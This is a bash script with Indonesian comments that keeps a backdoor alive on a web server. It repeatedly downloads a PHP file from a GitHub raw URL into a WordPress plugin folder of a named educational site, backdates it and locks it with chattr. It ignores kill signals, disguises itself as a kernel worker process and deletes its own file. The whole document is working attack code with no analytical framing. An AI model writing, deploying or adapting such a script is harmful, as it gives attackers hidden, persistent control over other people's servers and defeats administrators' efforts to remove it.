#!/bin/bash

# 1. Proteksi Sinyal Maksimal
# Mengunci skrip agar mengabaikan hampir semua upaya penghentian standar
trap '' 1 2 3 15 18 19 20

URL="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple2.php"
DIR="/home/u782030068/domains/dypcoei.edu.in/public_html/wp-content/plugins/betterdocs/includes/elementor/widgets"
FILE="$DIR/default.php"
TIME="201201081531.12"

# 2. Fungsi Immutability (Mengunci File di Level Sistem)
# Menggunakan atribut 'i' agar file tidak bisa dihapus/diedit bahkan oleh ROOT
lock_file() {
    chattr +i "$FILE" 2>/dev/null
    chattr +i "$0" 2>/dev/null # Mencoba mengunci skrip ini sendiri
}

unlock_file() {
    chattr -i "$FILE" 2>/dev/null
}

# 3. Logika Dual-Process (Double Layer)
# Skrip akan menjalankan salinan dirinya sendiri secara terus menerus
maintain() {
    while true; do
        if [ ! -f "$FILE" ]; then
            unlock_file
            curl -sL "$URL" -o "$FILE"
            chmod 644 "$FILE"
            touch -t "$TIME" "$FILE"
            lock_file
        fi
        sleep 0.5 # Pengecekan sangat cepat (agresif)
    done
}

# 4. Anti-Kill via Infinite Subshell
# Menjalankan fungsi dalam subshell yang akan memicu ulang jika mati
daemonize() {
    until maintain; do
        echo "Respawning process..." > /dev/null
        sleep 1
    done
}

# Eksekusi
# Menyamarkan nama proses menjadi kernel thread
echo -ne "[kworker/0:1H-events_high]\x00" > /proc/self/comm 2>/dev/null

# Jalankan secara background dan lepaskan dari sesi terminal
(daemonize) & disown
rm -f "$0" 2>/dev/null # Self-delete file skrip asli
exit 0
